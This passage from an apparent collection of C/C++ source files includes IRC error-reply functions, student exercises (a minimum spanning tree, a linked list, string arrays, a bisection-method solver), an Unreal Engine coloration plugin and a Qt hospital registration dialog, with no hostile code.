\"401 \" << name << \" \" << input_name << \" :No such nick/channel\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tE402(REP_ARG, const std::string &server_name)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"402 \" << name << \" \" << server_name << \" :No such server\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid \tE403(REP_ARG, const std::string &channel)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"403 \" << name << \" \" << channel << \" :No such channel\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid \tE404(REP_ARG, const std::string &channel)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"404 \" << name << \" \" << channel << \" :Cannot send to channel\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tE405(REP_ARG, const std::string &channel)\r\n{\r\n\tstd::stringstrea",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   WrongAnimal.cpp                                    :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: oldault <oldault@student.42.fr>            +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/02 10:27:25 by svolodin          #+#    #+#             */\n/*   Updated: 2024/05/02 14:49:17 by oldault          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"WrongAnimal.hpp\"\n\nWrongAnimal::WrongAnimal() : _type(\"WrongAnimal\")\n{\n  std::cout << BOLD(FGRN(\"WrongAnimal \")) << UNDL(FGRN(\"default\")) << FGRN(\" constructor called\\n\");\n\n  return ;\n}\n\nWrongAnimal::WrongAnimal(const std::string& type) : _type(type)\n{\n  std::cout << BOLD(FGRN(\"WrongAnimal\")) << FGRN(\" on \") << UNDL(FGRN( << type << )) << FGRN(\" constructor called\\n\");\n\n  return ;\n}\n\nWrongAnimal::~WrongAnimal()\n{\n  std::cout << BOLD(FRED(\"WrongAnimal\")) << FRED(\" destructor called\\n\");\n\n  return ;\n}\n\nWrongAnimal::WrongAnimal(const WrongAnimal& src)\n{\n  *this = src;\n  std::cout << BOLD(FGRN(\"WrongAnimal \")) << FGRN(\" copy assignement called\\n\");\n\n  return ;\n}\n\nWrongAnimal& WrongAnimal::operator=(const WrongAnimal& src)\n{\n  std::cout << BOLD(FGRN(\"WrongAnimal \")) << FGRN(\" copy operator called\\n\");\n  if (this != &src) {\n    _type = src._type;\n  }\n\n  return *this;\n}\n\nvoid WrongAnimal::makeSound() const \n{\n  std::cout << FMAG(ITAL(\"\\t* Unknown WrongAnimal screeches *\\n\"));\n\n  return ;\n}\n\nstd::string WrongAnimal::getType() const\n{\n  return _type;\n}\n",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"CustomActorColorationRegister.h\"\n\n#include \"CustomActorColorationSettings.h\"\n#include \"GameFramework/ActorPrimitiveColorHandler.h\"\n\n#define LOCTEXT_NAMESPACE \"CustomActorColorationRegister\"\n\nUCustomActorColorationRegister::UCustomActorColorationRegister()\n{\n#if ENABLE_ACTOR_PRIMITIVE_COLOR_HANDLER\n\tif (HasAnyFlags(RF_ClassDefaultObject) && ExactCast<UCustomActorColorationRegister>(this))\n\t{\n\t\tconst UCustomActorColorationSettings* Settings = UCustomActorColorationSettings::Get();\n\t\t\n\t\t// Cast Shadow\n\t\tif(Settings->bUseColorationCastShadow)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CastShadow\"), LOCTEXT(\"CastShadow\", \"Cast Shadow\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif (InPrimitiveComponent->CastShadow)\n\t\t\t\t{\n\t\t\t\t\treturn FLinearColor::Red;\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// Capsule Shadow\n\t\tif(Settings->bUseColorationCastCapsuleShadow)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CastCapsuleShadow\"), LOCTEXT(\"CastCapsuleShadow\", \"Cast Capsule Shadow\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif (AActor* Actor = InPrimitiveComponent->GetOwner())\n\t\t\t\t{\n\t\t\t\t\tTArray<USkeletalMeshComponent*> SkelMeshComponents;\n\t\t\t\t\tActor->GetComponents(USkeletalMeshComponent::StaticClass(), SkelMeshComponents);\n\t\t\t\t\tfor (USkeletalMeshComponent* SkelMeshComponent : SkelMeshComponents)\n\t\t\t\t\t{\n\t\t\t\t\t\tconst bool bCastDirect = SkelMeshComponent->bCastCapsuleDirectShadow;\n\t\t\t\t\t\tconst bool bCastIndirect = SkelMeshComponent->bCastCapsuleIndirectShadow;\n\t\t\t\t\t\tif(bCastDirect)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(bCastIndirect)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\treturn FLinearColor::Red; // Direct && Indirect\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\treturn FLinearColor::Green; // Direct\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if(bCastIndirect)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\treturn FLinearColor::Blue; // Indirect\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// PhysicalMaterial\n\t\tif(Settings->bUseColorationPhysicalMaterial)\n\t\t{\n\t\t\t// PhysicalMaterial Simple\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"PhysicalMaterialSimple\"), LOCTEXT(\"PhysicalMaterialSimple\", \"PhysicalMaterial Simple\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif(const FBodyInstance* BodyInstance = InPrimitiveComponent->GetBodyInstance())\n\t\t\t\t{\n\t\t\t\t\tconst UPhysicalMaterial* PhysicalMaterial = BodyInstance->GetSimplePhysicalMaterial();\n\t\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->PhysicalMaterialColorMap;\n\t\t\t\t\tif(ColorMap.Contains(PhysicalMaterial))\n\t\t\t\t\t{\n\t\t\t\t\t\treturn *ColorMap.Find(PhysicalMaterial);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\n\t\t\t// PhysicalMaterial Complex\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"PhysicalMaterialComplex\"), LOCTEXT(\"PhysicalMaterialComplex\", \"PhysicalMaterial Complex\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif(const FBodyInstance* BodyInstance = InPrimitiveComponent->GetBodyInstance())\n\t\t\t\t{\n\t\t\t\t\tconst TArray<UPhysicalMaterial*> PhysicalMaterials = BodyInstance->GetComplexPhysicalMaterials();\n\n\t\t\t\t\tif(!PhysicalMaterials.IsEmpty())\n\t\t\t\t\t{\n\t\t\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->PhysicalMaterialColorMap;\n\n\t\t\t\t\t\tFLinearColor ResultColor = FLinearColor::Black;\n\t\t\t\t\t\tfor (const auto PhysicalMaterial : PhysicalMaterials)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(ColorMap.Contains(PhysicalMaterial))\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tResultColor += *ColorMap.Find(PhysicalMaterial);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn ResultColor / PhysicalMaterials.Num();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// CollisionPreset\n\t\tif(Settings->bUseColorationCollisionPreset)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CollisionPreset\"), LOCTEXT(\"CollisionPreset\", \"Collision Preset\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tconst FName ProfileName = InPrimitiveComponent->GetCollisionProfileName();\n\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->CollisionPresetColorMap;\n\t\t\t\tif(ColorMap.Contains(ProfileName))\n\t\t\t\t{\n\t\t\t\t\treturn *ColorMap.Find(ProfileName);\n\t\t\t\t}\n\t\t\t\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\t}\n#endif\n}\n",
    "/*---------------------------------------------------------\r\nAssignment : 07\r\nTitle : You have a business with several offices; you want to lease phone lines to connect them up with each other; and the phone company charges different amounts of money to connect different pairs of cities. You want a set of lines that connects all your office with a minimum total cost. Solve the problem by suggesting appropriate data structures.\r\n(Minimum Spanning Tree)\r\n-----------------------------------------------------------*/\r\n\r\n#include<iostream>\r\nusing namespace std;\r\n\r\n\r\nclass snode\r\n{ \r\n  public:        // data structure for sparse matrix.\r\n   char u1,u2;\r\n   int wt;\r\n};\r\n\r\nclass test\r\n{\r\n\t int n,m,x;\r\n\t snode arr[10],res[10];\r\npublic:\r\n\ttest()\r\n\t{\r\n\t\tn=0;\r\n\t\tm=1;\r\n\t}\r\n   \r\n     void inputsparse();\r\n     void displaysparse();\r\n     void bsort();\r\n     void prims();\r\n     void dispmst();\r\n};\r\n\r\n // Function to Display result\r\nvoid test::dispmst()    \r\n{\r\n    for(int i=0;i<m;i++)\r\n     {\r\n         cout<<res[i].u1<<\" \"<<res[i].u2<<\" \"<<res[i].wt<<endl;\r\n     }\r\n}\r\n\r\n// Function to find minimum spanning tree.\r\n void test::prims()\r\n{\r\n\tint cnt=0;\r\n\tint flag1,flag2,i;\r\n     res[0]=arr[0];\r\n     m=1;\r\n    cnt=1;\r\n \r\n \tdo\r\n \t{\r\n         for(i=1; i<n  ; i++) //arr\r\n         {\r\n            flag1=0;\r\n            flag2=0;\r\n\t        for(int j=0;j<m;j++)\r\n\t         {  \t\t\t \r\n\t\t      if((arr[i].u1==res[j].u1 || arr[i].u1==res[j].u2 ) && flag1==0) \r\n\t\t      {\r\n\t\t          flag1++;\t\t\r\n\t\t      }\r\n\t\t      if((arr[i].u2==res[j].u1 || arr[i].u2==res[j].u2 ) && flag2==0) \r\n\t\t      {\r\n\t\t          flag2++;\t\t        \r\n\t\t      }\r\n\t\t \t}\t\t\r\n\t\t \t\t\t \r\n\t\t\tif(flag1!=1  ^ flag2 !=1) // ^ Exore operation. \r\n\t\t\t{\r\n\r\n\t\t\t\t \tres[m++]=arr[i];\r\n\t\t\t\t \t\t\t \t\t\t\t\r\n\t\t\t}\t\t \t\t \t\t \t\r\n\t\t\t \r\n\t\t \t\r\n            }\r\n            cnt = x-1;\r\n    }while(m!=cnt)       ;\r\n}           \r\n           \r\n         \r\n// Function tio Read input graph. \r\n void test::inputsparse()\r\n {\r\n \r\n cout<<\"ENTER NO OF EDGES: \";\r\n cin>>n;\r\n cout<<\"ENTER NO OF VERTICES: \";\r\n cin>>x;\r\n  for(int i=0;i<n;i++)\r\n  {\r\n      \tcout<<\"ENTER 1ST VERTEX: \";\r\n     \tcin>>arr[i].u1;\r\n       \tcout<<\"ENTER 2ND VERTEX: \";\r\n      \tcin>>arr[i].u2;\r\n       \tcout<<\"ENTER WEIGHT: \";\r\n      \tcin>>arr[i].wt;\r\n      \tcout<<endl;\r\n    }  \r\n    bsort();\r\n }\r\n\r\nvoid test::displaysparse()\r\n{\r\n       for(int i=0;i<n;i++)\r\n     {\r\n         cout<<arr[i].u1<<\" \"<<arr[i].u2<<\" \"<<arr[i].wt<<endl;\r\n     }\r\n}\r\n\r\n\r\n//Sort the given edges of the graph using bubble sort\r\nvoid test::bsort()\r\n{\r\n  snode temp;\r\n     for(int i=0;i<n-1;i++)\r\n     {\r\n           for(int j=0;j<n-1-i;j++)\r\n           {\r\n               if(arr[j].wt>arr[j+1].wt)\r\n               {\r\n                   temp=arr[j];\r\n                    arr[j]=arr[j+1];\r\n                    arr[j+1]=temp;\r\n                }\r\n           }\r\n     }\r\n\r\n}\r\n\r\n\r\nint main()\r\n{\r\n   test obj;\r\n   obj.inputsparse();\r\n   obj.displaysparse();\r\n   obj.prims();\r\n   cout<<\"RESULT:\"<<endl;\r\n   obj.dispmst();\r\nreturn 0;\r\n}\r\n\r\n\r\n/*\r\ngescoe@gescoe-OptiPlex-3010:~/Desktop$ g++ sparse1.cpp \r\ngescoe@gescoe-OptiPlex-3010:~/Desktop$ ./a.out\r\nENTER NO OF EDGES: 8\r\nENTER NO OF VERTICES: 7\r\nENTER 1ST VERTEX: 1\r\nENTER 2ND VERTEX: 2\r\nENTER WEIGHT: \r\n1\r\n\r\nENTER 1ST VERTEX: 1\r\nENTER 2ND VERTEX: 3\r\nENTER WEIGHT: 2\r\n\r\nENTER 1ST VERTEX: 2\r\nENTER 2ND VERTEX: 4\r\nENTER WEIGHT: 3\r\n\r\nENTER 1ST VERTEX: 4\r\nENTER 2ND VERTEX: 5\r\nENTER WEIGHT: 4\r\n\r\nENTER 1ST VERTEX: 2\r\nENTER 2ND VERTEX: 5\r\nENTER WEIGHT: 2\r\n\r\nENTER 1ST VERTEX: 3\r\nENTER 2ND VERTEX: 5\r\nENTER WEIGHT: 4\r\n\r\nENTER 1ST VERTEX: 3\r\nENTER 2ND VERTEX: 7\r\nENTER WEIGHT: 3\r\n\r\nENTER 1ST VERTEX: 6\r\nENTER 2ND VERTEX: 7\r\nENTER WEIGHT: 2\r\n\r\n1 2 1\r\n1 3 2\r\n2 5 2\r\n6 7 2\r\n2 4 3\r\n3 7 3\r\n4 5 4\r\n3 5 4\r\n\r\ncnt6\r\nm6RESULT:\r\n1 2 1\r\n1 3 2\r\n2 5 2\r\n2 4 3\r\n3 7 3\r\n6 7 2\r\ngescoe@gescoe-OptiPlex-3010:~/Desktop$ ^C\r\ngescoe@gescoe-OptiPlex-3010:~/Desktop$ \r\n\r\n\r\n*/",
    "#include <iostream>\nusing namespace std;\n\nstruct Node {\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();\n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;\n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;\n\n\tif (START == NULL || newNode->noMhs <= START->noMhs) {\n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\tnewNode->next = START;\n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode;\n\t\t}\n\t\tnewNode->prev = NULL;\n\t\tSTART = newNode;\n\t}\n\telse {\n\t\tNode* current = START;\n\t\tNode* previous = NULL;\n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs)\n\t\t{\n\t\t\tprevious = current;\n\t\t\tcurrent = current->next;\n\t\t}\n\t\tnewNode->next = current;\n\t\tnewNode->prev = previous;\n\n\t\tif (current != NULL)\n\t\t{\n\t\t\tcurrent->prev = newNode;\n\t\t}\n\n\t\tif (previous != NULL)\n\t\t{\n\t\t\tprevious->next = newNode;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current;\n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo;\n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START;\n\tprevious = NULL;\n\n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mThe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\tif (current == START)\n\t{\n\t\tSTART = START->next;\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = NULL;\n\t\t}\n\t}\n\telse\n\t{\n\t\tprevious->next = current->next;\n\t\tif (current->next != NULL)\n\t\t{\n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" delete\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\n\nvoid traverse() \n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords in ascending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid revtraverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord in descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\n\tNode* prev, * curr;\n\tprev = curr = NULL;\n\tcout << \"\\nEnter the roll number of the student whose record you want to search: \";\n\tint num;\n\tcin >> num;\n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl;\n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl;\n\t\tcout << \"\\nName: \" << curr->name << endl;\n\t}\n}\n\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"2. Delete a record from the list\" << endl;\n\t\t\tcout << \"3. View all records in the ascending order of roll numbers\" << endl;\n\t\t\tcout << \"4. View all records in the descending order of roll numbers\" << endl;\n\t\t\tcout << \"5. Search for a record in the list\" << endl;\n\t\t\tcout << \"6.Exit\" << endl;\n\t\t\tcout << \"\\nEnter your choice (1-6): \";\n\t\t\tchar ch;\n\t\t\tcin >> ch;\n\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\tcase '1':\n\t\t\t\taddNode();\n\t\t\t\tbreak;\n\t\t\tcase '2':\n\t\t\t\tdeleteNode();\n\t\t\t\tbreak;\n\t\t\tcase '3':\n\t\t\t\ttraverse();\n\t\t\t\tbreak;\n\t\t\tcase '4':\n\t\t\t\trevtraverse();\n\t\t\t\tbreak;\n\t\t\tcase '5':\n\t\t\t\tsearchData();\n\t\t\t\tbreak;\n\t\t\tcase '6':\n\t\t\t\treturn 0;\n\t\t\tdefault:\n\t\t\t\tcout << \"\\nInvalid option\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcatch (exception& e)\n\t\t{\n\t\t\tcout << \"Chek for the values entered.\" << endl;\n\t\t}\n\t}\n}\n\n",
    "#include <iostream>\n#include <cstdio>\nusing namespace std;\n\nvoid stringIn(char *str1, char *str2, int n){\n//searching position in array for string recording:\n//expression !(*str1) returns false if *str1 is a symbol.\n//if(*str1){...} - will be work, when str1 not contains '\\0' or empty.\n\tcout<<\"Array in stringIn(): \"<<str2<<\" and n: \"<<n<<\"\\n\";\n\twhile(n!=0){\n\t\tif(!(*str1)) n--; //null-symbol will decrease n and we go to next part of str;\n\t\tstr1++;           //go to next element of array str with step - char;\n\t\tcout<<\"Thats time in while loop: \"<<str1<<\"\\n\";\n\t}\n//record string in array:\n\twhile(*str2){\n\t\t*str1 = *str2;\n\t\tstr1++;\n\t\tstr2++;\n\t}\n*str1 = '\\0'; //record zero-symbol in the end string of array.\n}\n\nvoid stringOut(char *str, int n){\n//this func boost output string from array, using\n//the contents of the string and index n of place;\n\twhile(n!=0){\n\t\tif(!(*str)) n--;\n\t\tstr++;\n\t}\n\tcout<<str<<endl;\n}\n\nint main(){\n\tint n;\n    char str[120];\t\t\n    char s [30];\n    cout<<\"Input your three  strings:\\n\";\n    for (n =0; n<3;n++){\n    \tcout<<\"Enter your string: \\n\";\n    \tfgets(s,30,stdin);\n    \tstringIn(str,s,n);\n    \tcout<<\"\\n\";\n    }\n    stringIn(str,(char*)\"One more string\",3); //This text is used as a char array;\n//Output results:\n    for (n=0;n<=3; n++)\n    \tstringOut(str,n);\n    return 0;\n}\n",
    "#include \"register.h\"\r\n#include \"ui_register.h\"\r\n#include \"patient.h\"\r\n#include \"login.h\"\r\n#include \"mainwindow.h\"\r\n#include <QFile>\r\n#include <QTextStream>\r\n#include <QDebug>\r\n#include <QMessageBox>\r\n#include <QPixmap>\r\nRegister::Register(QString selectedRole, QWidget *parent)\r\n    : QDialog(parent)\r\n    , ui(new Ui::Register),\r\n    patientData(\"C:/Users/HP/Desktop/CS2 Lab Project/Patient.txt\")\r\n{\r\n    ui->setupUi(this);\r\n\r\n    QPixmap pix(\"C:/Users/HP/Downloads/cs2LabProject-main/cs2LabProject-main/vintage-grunge-blue-concrete-texture-studio-wall-background-with-vignette.jpg\");\r\n    backgroundLabel = new QLabel(this);\r\n    backgroundLabel->setPixmap(pix);\r\n    backgroundLabel->setScaledContents(true);\r\n    backgroundLabel->setGeometry(0, 0, geometry().width(), geometry().height());\r\n    backgroundLabel->lower();\r\n    role = new MainWindow;\r\n\r\n    this->selectedRole=selectedRole;\r\n\r\n    if (!patientData.open(QIODevice::Append | QIODevice::Text))\r\n    {\r\n        qDebug() << \"Could not open file for writing:\";\r\n        return;\r\n    }\r\n\r\n\r\n\r\n    QFile doctorData(\"C:/Users/HP/Desktop/CS2 Lab Project/Doctor.txt\");\r\n    if (!doctorData.open(QIODevice::Append | QIODevice::Text))\r\n    {\r\n        qDebug() << \"Could not open file for writing: DoctorData.txt\";\r\n        return;\r\n    }\r\n\r\n    QFile nurseData(\"C:/Users/HP/Desktop/CS2 Lab Project/Nurse.txt\");\r\n    if (!nurseData.open(QIODevice::Append | QIODevice::Text))\r\n    {\r\n        qDebug() << \"Could not open file for writing: NurseData.txt\";\r\n        return;\r\n    }\r\n\r\n    patientData.close();\r\n    doctorData.close();\r\n    nurseData.close();\r\n}\r\n\r\nRegister::~Register()\r\n{\r\n    delete ui;\r\n}\r\nvoid Register::saveVariables(const QString &filename, const QString &variable1, const QString &variable2)\r\n{\r\n    QFile file(filename);\r\n    QFile file1(\"C:/Users/HP/Desktop/CS2 Lab Project/Medical Record.txt\");\r\n\r\n    if (!file.open(QIODevice::Append | QIODevice::Text))\r\n    {\r\n        qDebug() << \"Could not open file for writing:\" << filename;\r\n        return;\r\n    }\r\n\r\n    QTextStream out(&file);\r\n    out << variable1 << \" \" << variable2<< \"\\n\";\r\n\r\n    if (filename == \"C:/Users/HP/Desktop/CS2 Lab Project/Patient.txt\")\r\n    {\r\n        if (!file1.open(QIODevice::Append | QIODevice::Text))\r\n        {\r\n            qDebug() << \"Could not open file for writing: Medical Record.txt\";\r\n            return;\r\n        }\r\n\r\n        QTextStream out2(&file1);\r\n        out2 << variable1 << \" \" <<\"\\n\";\r\n\r\n        file1.close();\r\n    }\r\n\r\n    file.close();\r\n}\r\n\r\nvoid Register::on_LoginPB_clicked()\r\n{\r\n    QString name = ui->UsernameLE->text();\r\n\r\n\r\n    role = new MainWindow;\r\n\r\n    // QString selectedRole = \"None\";\r\n    QString filename;\r\n\r\n    QString pass = ui->PasswordLE->text();\r\n    QString retype = ui->confirmLE->text();\r\n\r\n    if (pass != retype) {\r\n        QMessageBox::critical(this, tr(\"\"), tr(\"Password is not be equal\"));\r\n    } else if (pass==retype) {\r\n    if (selectedRole == \"Patient\")\r\n    {\r\n        filename = \"C:/Users/HP/Desktop/CS2 Lab Project/Patient.txt\";\r\n\r\n        saveVariables(filename, name, pass);\r\n        this->hide();\r\n        Login *ll = new Login(selectedRole);\r\n        ll->show();\r\n    }\r\n    else if (selectedRole == \"Doctor\")\r\n    {\r\n        filename = \"C:/Users/HP/Desktop/CS2 Lab Project/Doctor.txt\";\r\n\r\n        saveVariables(filename, name, pass);\r\n        this->hide();\r\n        Login *ll = new Login(selectedRole);\r\n        ll->show();\r\n    }\r\n    else if (selectedRole == \"Nurse\")\r\n    {\r\n        filename = \"C:/Users/HP/Desktop/CS2 Lab Project/Nurse.txt\";\r\n\r\n        saveVariables(filename, name, pass);\r\n        this->hide();\r\n        Login *ll = new Login(selectedRole);\r\n        ll->show();\r\n    }\r\n    else if (selectedRole == \"aa\")\r\n    {\r\n        filename = \"C:/Users/HP/Desktop/CS2 Lab Project/Admin.txt\";\r\n\r\n        saveVariables(filename, name, pass);\r\n        this->hide();\r\n        Login *ll = new Login(selectedRole);\r\n        ll->show();\r\n    }\r\n    }\r\n\r\n}\r\n\r\nvoid Register::on_Register_accepted()\r\n{\r\n\r\n\r\n}\r\n\r\n",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <windows.h>\n#define eps 1e-3\n\nvoid read_file(char filename[], int &n, float A[][100], int &check);\nvoid input_file(char a[], float A[][100], int &n);\nvoid change(float A[][100], float B[], int n);\nvoid print_POLYNOMIAL(float B[], int n);\nfloat Fx(float B[], int n, float x0);\nvoid enter_input(float &a, float &b, float B[], int n);\nfloat solve(float B[], float a, float b, int n);\nvoid information();\nvoid result(char a[]);\nint menu_input(int &com);\nvoid mtA(float A[][100], int &n);\nvoid setcolor(int backgound_color, int text_color);\n\nint main()\n{\n    int n,com;\n    float a, b,c;\n    char name[100], re[100], other[1],newP[1];\n    float A[100][100];\n    float B[100];\n\n    information();//Introduce the topic and related information\n   \n    do{\n       menu_input(com);\n       if(com==1){\n        setcolor(0,3);\n        printf(\"\\tMoi ban nhap ma tran A\\n\");\n        printf(\"\\tNhap buc cua ma tran: \");\n        setcolor(0,8);\n        scanf(\"%d\", &n);\n        mtA(A, n);\n       }\n       else if(com==2){\n        (getchar()) != '\\n';         \n        input_file(name,A,n);\n       }\n       \n        setcolor(0,15);\n        change(A,B,n);\n        print_POLYNOMIAL(B,n);\n         while (1){\n            enter_input(a,b,B,n);\n            c=solve(B,a,b,n);\n            setcolor(0,15);\n            printf(\"\\n    Bang gia tri thuc hien phuong phap chia doi\\n\");\n            setcolor(0,3);\n            printf(\"\\nNgiem cua phuong trinh la:  %.3f\", c);\n            printf(\"\\n\\nBan co muon nhap khoang nghiem khac khong (y/n)? \");\n            setcolor(0,8);\n            scanf(\"%s\",other);\n            if (other[0]!='y') break;\n        }\n        setcolor(0,3);\n        printf(\"\\n\\nBan co muon tim nghiem voi da thuc khac khong(Neu muon nhap lai thi chon c, con khong muon thi nhap phim bat ki)? \");\n        setcolor(0,8);\n        scanf(\"%s\", newP);\n    }while(newP[0]=='c');\n    }\n\nvoid setcolor(int backgound_color, int text_color)\n{\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    int color_code = backgound_color * 16 + text_color;\n    SetConsoleTextAttribute(hStdout, color_code);\n}\n\nvoid information()\n{\n    int i;\n    setcolor(0, 3);\n    printf(\"\\n%9c\", 201);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\", 187);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c                             DO AN LAP TRINH TINH TOAN                                %c\", 4, 4);\n    printf(\"\\n        %c                   DE TAI: Tim nghiem gan dung bang phuong phap chia doi              %c\", 4, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c       Sinh vien thuc hien:                       Giao vien huong dan:                %c\", 4, 4);\n    printf(\"\\n        %c           %c Le Ngoc Lam Na                            %c Do Thi Tuyet Hoa             %c\", 4, 45, 45, 4);\n    printf(\"\\n        %c           %c Le Xuan Tung Son  %56c\", 4, 45, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c\", 200);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\\n\", 188);\n}\n\nvoid read_file(char filename[], int &n, float A[][100], int &check)\n{   setcolor(0,3);\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL)\n    {\n        check = 0;        \n        return;\n    }\n    fscanf(file, \"%d\", &n); // read array size\n    char a;\n    int s = 0, count = 0;\n\n    // check size file\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            if (fscanf(file, \"%f\", &A[i][j]) == 1)\n            { // save data into array A\n                s++;\n                if ((a = fgetc(file)) != '\\n')\n                {\n                    if (a != EOF)\n                        count++;\n                